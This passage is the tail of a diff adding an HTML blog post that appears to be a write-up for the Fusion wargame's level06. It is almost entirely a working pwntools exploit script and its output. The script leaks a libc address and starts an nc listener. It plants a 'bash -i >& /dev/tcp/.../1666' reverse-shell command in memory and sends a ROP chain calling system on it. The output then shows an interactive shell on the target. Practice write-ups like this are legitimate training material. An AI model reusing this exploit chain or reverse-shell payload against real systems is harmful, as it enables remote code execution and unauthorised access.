+<span class="n">sleep</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="mi">49</span><span class="o">*</span><span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">+</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;added!&#39;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;g A</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;// Sending 1500 bytes</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+<span class="n">libcleak</span> <span class="o">=</span>  <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+<span class="n">libcleak</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">libcleak</span><span class="p">[</span><span class="mi">1412</span><span class="p">:</span><span class="mi">1416</span><span class="p">])</span>
+<span class="n">libc_addr</span> <span class="o">=</span> <span class="n">libcleak</span>  <span class="o">-</span> <span class="mi">1545776</span>
+<span class="n">libc_addr</span> <span class="o">=</span> <span class="n">libc_addr</span> <span class="o">&amp;</span> <span class="mh">0xfffff000</span>
+<span class="n">p</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+<span class="n">k</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+
+<span class="c1">#setting up addresses</span>
+<span class="n">libcelf</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">libc_addr</span>
+<span class="n">system_libc_addr</span> <span class="o">=</span> <span class="n">libcelf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]</span>
+<span class="n">exit_libc_addr</span> <span class="o">=</span> <span class="n">libcelf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;exit&#39;</span><span class="p">]</span>
+<span class="n">twopopret_gad</span> <span class="o">=</span> <span class="n">libc_addr</span> <span class="o">+</span> <span class="mh">0x000a7a5a</span>
+<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">[LEAKED LIBC ADDR : </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc_addr</span><span class="p">)</span><span class="si">}</span><span class="s1">]</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+
+
+<span class="n">p</span> <span class="o">=</span> <span class="n">new_instance</span><span class="p">(</span><span class="n">serverip</span><span class="p">,</span><span class="n">port</span><span class="p">)</span>
+<span class="n">k</span> <span class="o">=</span> <span class="n">new_instance</span><span class="p">(</span><span class="n">serverip</span><span class="p">,</span><span class="n">port</span><span class="p">)</span>
+<span class="n">l</span> <span class="o">=</span> <span class="n">new_instance</span><span class="p">(</span><span class="n">serverip</span><span class="p">,</span><span class="n">port</span><span class="p">)</span>
+
+
+<span class="c1">#starting a process that listen on port 1666 for the shell</span>
+<span class="nb">print</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">[LISTENING FOR SHELL]</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+<span class="n">processarr</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;nc&#39;</span><span class="p">,</span><span class="s1">&#39;-v&#39;</span><span class="p">,</span><span class="s2">&quot;-lp&quot;</span> <span class="p">,</span><span class="s1">&#39;1666&#39;</span><span class="p">]</span>
+<span class="n">shell</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">processarr</span><span class="p">)</span>
+
+<span class="c1">#putting the reverse shell command in a thread&#39;s stack</span>
+<span class="n">reverse_shell</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;bash -i &gt;&amp; /dev/tcp/&#39;</span><span class="o">+</span><span class="n">my_local_ip</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span><span class="o">+</span><span class="sa">b</span><span class="s1">&#39;/1666&#39;</span><span class="o">+</span><span class="sa">b</span><span class="s1">&#39; &lt;&amp;1</span><span class="se">\n</span><span class="s1">&#39;</span>
+<span class="n">set_key</span><span class="p">(</span><span class="n">l</span><span class="p">,</span><span class="s1">&#39;revshell&#39;</span><span class="p">,</span><span class="mi">85535</span><span class="p">,</span><span class="n">reverse_shell</span><span class="o">+</span><span class="n">p8</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="mi">65535</span><span class="o">*</span><span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="p">)</span>
+<span class="n">sleep</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
+<span class="c1">#calculated at runtime with gdb , constant across runs</span>
+<span class="n">reverse_shell_libc_offset</span> <span class="o">=</span> <span class="mi">34413856</span>
+<span class="n">reverse_shell_str_addr</span> <span class="o">=</span> <span class="n">libc_addr</span> <span class="o">-</span> <span class="n">reverse_shell_libc_offset</span>
+
+<span class="c1">#spawning a shell with ROP</span>
+<span class="n">rop_chain_shell</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="n">system_libc_addr</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">exit_libc_addr</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">reverse_shell_str_addr</span><span class="p">)</span>
+<span class="n">k</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;s g 2000&#39;</span><span class="p">)</span>
+<span class="n">set_key</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="s1">&#39;t&#39;</span><span class="p">,</span><span class="n">VLA_offset</span><span class="p">,</span><span class="mi">12</span><span class="o">*</span><span class="n">p8</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span><span class="o">+</span><span class="n">rop_chain_shell</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+<span class="n">k</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="mi">2000</span><span class="o">*</span><span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">+</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+<span class="n">sleep</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span>
+<span class="n">testshell</span><span class="p">(</span><span class="n">shell</span><span class="p">)</span>
+<span class="c1">#fallback</span>
+<span class="n">shell</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+<span class="n">exit</span><span class="p">()</span>
+</code></pre></div>
+
+<ul>
+<li>executing this in our host gives us :</li>
+</ul>
+<div class="codehilite"><pre><span></span><code>./level06_exploit.py
+
+<span class="o">[</span>LEAKED<span class="w"> </span>LIBC<span class="w"> </span>ADDR<span class="w"> </span>:<span class="w"> </span>0xb763b000<span class="o">]</span>
+
+
+<span class="o">[</span>LISTENING<span class="w"> </span>FOR<span class="w"> </span>SHELL<span class="o">]</span>
+
+
+congratz!
+
+$<span class="w"> </span>whoami
+whoami
+whoami:<span class="w"> </span>cannot<span class="w"> </span>find<span class="w"> </span>name<span class="w"> </span><span class="k">for</span><span class="w"> </span>user<span class="w"> </span>ID<span class="w"> </span><span class="m">20006</span>
+I<span class="w"> </span>have<span class="w"> </span>no<span class="w"> </span>name!@fusion:/$<span class="w"> </span>$<span class="w"> </span>ls
+ls
+bin
+boot
+cdrom
+dev
+etc
+home
+initrd.img
+initrd.img.old
+lib
+media
+mnt
+opt
+proc
+rofs
+root
+run
+sbin
+selinux
+srv
+sys
+tmp
+usr
+var
+vmlinuz
+vmlinuz.old
+I<span class="w"> </span>have<span class="w"> </span>no<span class="w"> </span>name!@fusion:/$<span class="w"> </span>$
+</code></pre></div>
+
+<h1>and voila.</h1>
+        </div>
+      </main>
+    </div>
+  </body>
+      
+    <footer>
+
+      <div class="contactme bar_item">
+        <a class="button" href="https://x.com/execius"><i class="fa-brands fa-x-twitter fa-2x"></i></a> 
+      </div>
+    </footer>
+
+</html> 
+
